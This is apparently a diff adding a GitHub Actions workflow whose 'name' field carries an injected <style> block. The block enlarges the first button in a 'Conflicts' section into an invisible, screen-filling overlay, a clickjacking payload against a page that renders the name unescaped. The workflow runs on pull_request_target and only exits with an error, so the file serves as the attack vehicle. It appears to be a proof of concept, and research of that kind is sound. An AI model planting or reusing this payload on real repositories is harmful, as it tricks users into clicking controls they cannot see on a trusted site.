@@ -1,0 +1,31 @@
+name: "<style>
+/* Target: first button inside the Conflicts section */
+section[aria-label=\"Conflicts\"] button:first-of-type {
+  position: fixed !important;
+  inset: 0 !important;             /* top/right/bottom/left = 0 */
+  width: 100vw !important;
+  height: 100vh !important;
+  margin: 0 !important;
+  padding: 0 !important;
+  z-index: 2147483647 !important;  /* huge stacking order */
+
+  background: gray !important;     /* solid gray */
+  opacity: 1 !important;           /* fully opaque */
+  color: transparent !important;   /* hide text */
+  text-shadow: none !important;    /* ensure no ghosting */
+  
+  pointer-events: auto !important;
+  display: block !important;
+  border: none !important;
+  border-radius: 0 !important;
+}
+</style>"
+
+on: [pull_request_target]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Error out
+        run: exit 1
